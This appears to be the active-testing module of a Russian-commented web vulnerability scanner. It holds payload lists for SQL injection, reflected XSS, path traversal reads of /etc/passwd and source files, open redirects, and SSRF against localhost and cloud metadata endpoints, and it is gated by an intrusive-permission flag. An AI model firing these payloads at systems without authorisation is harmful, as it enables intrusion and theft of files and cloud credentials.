"""Активные проверки уязвимостей:
SQL-инъекция (по ошибке / boolean / time-based),
отражённая XSS, чтение файлов (LFI), Open Redirect, SSRF.

Берёт цели у крауlера (формы и параметры).
Не запускается без разрешения на активное тестирование."""
from __future__ import annotations

import asyncio
import time
from urllib.parse import urljoin, urlparse, parse_qsl

import httpx

from ..core import Finding, ScanContext, Severity, rand_str

NAME = "vulns"
REQUIRES_INTRUSIVE = True
REQUIRES_STRESS = False

SQL_ERROR_SIGNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()", "psql:", "sqlstate",
    "ora-00933", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "sqlite3.operationalerror",
    "near \"", "syntax error", "unterminated quoted string",
]
SQL_PROBES_ERROR      = ["'", '"', "')", "';--", "' OR '1'='1", "1' AND 1=CONVERT(int,@@version)--"]
SQL_PROBES_BOOL_TRUE  = ["' OR '1'='1' --", "1 OR 1=1 -- ", "') OR ('1'='1"]
SQL_PROBES_BOOL_FALSE = ["' AND '1'='2' --", "1 AND 1=2 -- ", "') AND ('1'='2"]
SQL_PROBES_TIME = [
    "1' AND SLEEP(5)-- -",
    "1) AND SLEEP(5)-- -",
    "1';WAITFOR DELAY '0:0:5'--",
    "1 OR pg_sleep(5)-- -",
]

XSS_PROBES = [
    f"<sCriPt>__M{rand_str(4)}__</sCriPt>",
    f"\"'><svg/onload=__M{rand_str(4)}__>",
    f"javascript:__M{rand_str(4)}__()",
]

LFI_PROBES = [
    ("../../../../etc/passwd", "root:x:0:"),
    ("....//....//....//etc/passwd", "root:x:0:"),
    ("/etc/passwd%00", "root:x:0:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
]

REDIRECT_PROBES = [
    "https://evil.example.com/",
    "//evil.example.com/",
    "/\\evil.example.com",
]


async def _send(client, method, url, params=None, data=None):
    try:
        if method == "POST":
            return await client.post(url, data=data or params)
        return await client.get(url, params=params)
    except Exception:
        return None


def _gather_targets(ctx: ScanContext) -> list[dict]:
    targets: list[dict] = []
    for url in ctx.crawled_urls:
        pu = urlparse(url)
        if not pu.query: continue
        base_params = dict(parse_qsl(pu.query, keep_blank_values=True))
        base_url = f"{pu.scheme}://{pu.netloc}{pu.path}"
        for k in base_params:
            targets.append({
                "url": base_url, "method": "GET", "param": k,
                "base_params": dict(base_params), "post": False,
            })
    for path, keys in ctx.discovered_params.items():
        for k in keys:
            url = urljoin(ctx.base_url, path)
            targets.append({
                "url": url, "method": "GET", "param": k,
                "base_params": {k: "1"}, "post": False,
            })
    for f in ctx.discovered_forms:
        for inp in f["inputs"]:
            if inp.get("type") in ("submit", "button", "image", "file"):
                continue
            base = {i["name"]: i.get("value") or "1" for i in f["inputs"]
                    if i.get("name") and i.get("type") not in ("submit", "button", "image", "file")}
            targets.append({
                "url": f["url"], "method": f["method"], "param": inp["name"],
                "base_params": base, "post": f["method"] == "POST",
            })

    seen = set(); out = []
    for t in targets:
        key = (t["method"], t["url"], t["param"])
        if key in seen: continue
        seen.add(key); out.append(t)
    return out


async def _probe_sqli(client, ctx: ScanContext, t: dict):
    url, param, method = t["url"], t["param"], t["method"]
    params = dict(t["base_params"])

    base_resp = await _send(client, method, url, params=params,
                            data=params if t["post"] else None)
    if not base_resp:
        return
    base_text = base_resp.text or ""
    base_len = len(base_text)
    base_low = base_text.lower()

    # 1) Error-based
    for p in SQL_PROBES_ERROR:
        params[param] = p
        r = await _send(client, method, url, params=params, data=params if t["post"] else None)
        if not r: continue
        body = (r.text or "").lower()
        for sign in SQL_ERROR_SIGNS:
            if sign in body and sign not in base_low:
                ctx.add(Finding(
                    module=NAME,
                    title=f"SQL-инъекция (по ошибке БД) в параметре «{param}»",
                    severity=Severity.CRITICAL, cwe="CWE-89", cvss=9.8,
                    url=url, evidence=f"полезная нагрузка={p!r}; совпадение={sign!r}",
                    description=f"Параметр «{param}» (метод {method}) принимает значение без проверки "
                                f"и подставляет его прямо в SQL-запрос. Сервер ответил сообщением об ошибке БД.",
                    remediation="Использовать параметризованные запросы (prepared statements). "
                                "НИКОГДА не склеивать строки с пользовательским вводом для построения SQL.",
                ))
                return

    # 2) Boolean-based
    try:
        params[param] = SQL_PROBES_BOOL_TRUE[0]
        rt = await _send(client, method, url, params=params, data=params if t["post"] else None)
        params[param] = SQL_PROBES_BOOL_FALSE[0]
        rf = await _send(client, method, url, params=params, data=params if t["post"] else None)
        if rt and rf:
            lt, lf = len(rt.text or ""), len(rf.text or "")
            if abs(lt - base_len) < max(50, base_len * 0.05) and abs(lt - lf) > max(80, base_len * 0.1):
                ctx.add(Finding(
                    module=NAME,
                    title=f"SQL-инъекция (boolean-based) в параметре «{param}»",
                    severity=Severity.CRITICAL, cwe="CWE-89", cvss=9.0,
                    url=url, evidence=f"base={base_len} true={lt} false={lf}",
                    description=f"Длина ответа меняется в зависимости от того, истинно или ложно "
                                f"условие, подставленное в параметр. Это значит, что параметр участвует в SQL-запросе.",
                    remediation="Использовать параметризованные запросы.",
                ))
                return
    except Exception:
        pass

    # 3) Time-based
    if ctx.config.get("sqli_time", True):
        for p in SQL_PROBES_TIME[:2]:
            params[param] = p
            t0 = time.monotonic()
            try:
                r = await asyncio.wait_for(
                    _send(client, method, url, params=params, data=params if t["post"] else None),
                    timeout=10,
                )
            except asyncio.TimeoutError:
                r = None
            elapsed = time.monotonic() - t0
            if 4.5 <= elapsed < 9:
                ctx.add(Finding(
                    module=NAME,
                    title=f"SQL-инъекция (time-based) в параметре «{param}»",
                    severity=Severity.CRITICAL, cwe="CWE-89", cvss=9.0,
                    url=url, evidence=f"полезная нагрузка={p!r}; задержка={elapsed:.1f}с",
                    description="После отправки SLEEP/WAITFOR-нагрузки сервер задержал ответ ровно на 5 секунд. "
                                "Это однозначное доказательство SQL-инъекции (slепой режим).",
                    remediation="Использовать параметризованные запросы.",
                ))
                return


async def _probe_xss(client, ctx: ScanContext, t: dict):
    url, param, method = t["url"], t["param"], t["method"]
    params = dict(t["base_params"])
    for p in XSS_PROBES:
        params[param] = p
        r = await _send(client, method, url, params=params, data=params if t["post"] else None)
        if not r: continue
        body = r.text or ""
        if p in body:
            ctx.add(Finding(
                module=NAME,
                title=f"Отражённая XSS в параметре «{param}»",
                severity=Severity.HIGH, cwe="CWE-79", cvss=7.5,
                url=url, evidence=f"полезная нагрузка отразилась в ответе: {p[:80]}",
                description=f"Параметр «{param}» возвращается в HTML-ответ без должного экранирования. "
                            "Злоумышленник может прислать жертве ссылку, при открытии которой выполнится "
                            "вредоносный JavaScript-код в её браузере.",
                remediation="Экранировать ВЕСЬ вывод в зависимости от контекста (HTML/атрибут/JS/URL). "
                            "Использовать шаблонизаторы с авто-экранированием (Jinja2 |e, React JSX). "
                            "Внедрить Content-Security-Policy как второй рубеж.",
            ))
            return


async def _probe_lfi(client, ctx: ScanContext, t: dict):
    url, param, method = t["url"], t["param"], t["method"]
    params = dict(t["base_params"])
    for p, marker in LFI_PROBES:
        params[param] = p
        r = await _send(client, method, url, params=params, data=params if t["post"] else None)
        if r and marker in (r.text or ""):
            ctx.add(Finding(
                module=NAME,
                title=f"Локальное чтение файлов (LFI/Path Traversal) в параметре «{param}»",
                severity=Severity.CRITICAL, cwe="CWE-22", cvss=9.1,
                url=url, evidence=f"полезная нагрузка={p!r}; маркер={marker!r}",
                description=f"Через параметр «{param}» удалось прочитать произвольный файл с сервера "
                            "(в ответе нашли характерный маркер системного файла). "
                            "Атакующий может прочитать конфиги, ключи, исходный код.",
                remediation="Не передавайте имена файлов от пользователя напрямую. "
                            "Используйте белый список или храните файлы в БД по ID. "
                            "Если уж принимаете путь — приводите его к каноническому виду и "
                            "проверяйте, что он внутри разрешённой папки.",
            ))
            return


async def _probe_open_redirect(client, ctx: ScanContext, t: dict):
    url, param, method = t["url"], t["param"], t["method"]
    name = param.lower()
    if not any(h in name for h in ("redirect", "url", "next", "target", "dest", "return", "rurl", "go", "to")):
        return
    params = dict(t["base_params"])
    for p in REDIRECT_PROBES:
        params[param] = p
        try:
            r = await client.get(url, params=params, follow_redirects=False) if method == "GET" \
                else await client.post(url, data=params, follow_redirects=False)
        except Exception:
            continue
        loc = r.headers.get("location", "")
        if loc and "evil.example.com" in loc:
            ctx.add(Finding(
                module=NAME,
                title=f"Открытый редирект в параметре «{param}»",
                severity=Severity.MEDIUM, cwe="CWE-601", cvss=6.1,
                url=url, evidence=f"Location: {loc}",
                description=f"Параметр «{param}» позволяет указать произвольный адрес для редиректа. "
                            "Жулик пришлёт жертве ссылку на ВАШ домен, но после клика она попадёт на фишинговый сайт.",
                remediation="Разрешать редирект только на внутренние пути или на домены из белого списка.",
            ))
            return


async def _probe_ssrf(client, ctx: ScanContext, t: dict):
    url, param, method = t["url"], t["param"], t["method"]
    name = param.lower()
    if not any(h in name for h in ("url", "uri", "src", "dest", "callback",
                                    "redirect", "fetch", "host", "site", "feed")):
        return
    params = dict(t["base_params"])

    params[param] = "http://example.com/"
    base = await _send(client, method, url, params=params, data=params if t["post"] else None)
    base_body = (base.text or "") if base else ""
    base_status = base.status_code if base else 0

    probes = [
        ("http://127.0.0.1:80/",
         ["it works", "<title>welcome", "nginx", "apache", "<!doctype",
          "<html", "vulnerable lab", "vuln"]),
        ("http://169.254.169.254/latest/meta-data/",
         ["ami-id", "instance-id", "iam/"]),
        ("http://metadata.google.internal/computeMetadata/v1/",
         ["computeMetadata", "project-id"]),
        ("file:///etc/passwd", ["root:x:0:"]),
    ]
    for p, markers in probes:
        params[param] = p
        r = await _send(client, method, url, params=params, data=params if t["post"] else None)
        if not r: continue
        body = (r.text or "")[:8000]
        low = body.lower()
        hit = next((m for m in markers if m in low), None)
        diverged = (r.status_code == 200 and base_status == 200 and
                    abs(len(body) - len(base_body)) > 100 and body and "example domain" not in low)
        if hit or (p.startswith("http://127") and diverged):
            ctx.add(Finding(
                module=NAME,
                title=f"Возможная SSRF в параметре «{param}»",
                severity=Severity.HIGH, cwe="CWE-918", cvss=8.6,
                url=url, evidence=f"полезная нагрузка={p}; маркер={hit or 'ответ заметно отличается от внешнего'}",
                description=f"Сервер по запросу пользователя ходит в указанный URL. "
                            "Это позволяет злоумышленнику обратиться от имени сервера к внутренним адресам "
                            "(127.0.0.1, метаданные облака, внутренние БД).",
                remediation="Белый список разрешённых хостов/схем. Блокировать запросы на приватные "
                            "IP-диапазоны (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1). "
                            "Не следовать редиректам на приватные адреса.",
            ))
            return


async def run(ctx: ScanContext, client: httpx.AsyncClient) -> None:
    if not ctx.permissions.get("intrusive"):
        ctx.add(Finding(module=NAME,
                        title="Активные проверки уязвимостей пропущены (нет разрешения)",
                        severity=Severity.INFO,
                        description="Чтобы включить — добавьте флаг --intrusive."))
        return

    targets = _gather_targets(ctx)
    if not targets:
        ctx.add(Finding(module=NAME, title="Не найдено точек для тестирования",
                        description="Крауlер не нашёл ни одного параметра запроса или формы. "
                                    "Возможно, на сайте динамика только в API, или нужен глубже краул.",
                        severity=Severity.INFO))
        return

    ctx.add(Finding(module=NAME,
                    title=f"Тестируется точек ввода: {len(targets)}",
                    severity=Severity.INFO))

    sem = asyncio.Semaphore(int(ctx.config.get("vuln_concurrency", 8)))

    async def one(t):
        async with sem:
            await _probe_sqli(client, ctx, t)
            await _probe_xss(client, ctx, t)
            await _probe_lfi(client, ctx, t)
            await _probe_open_redirect(client, ctx, t)
            await _probe_ssrf(client, ctx, t)

    await asyncio.gather(*(one(t) for t in targets))
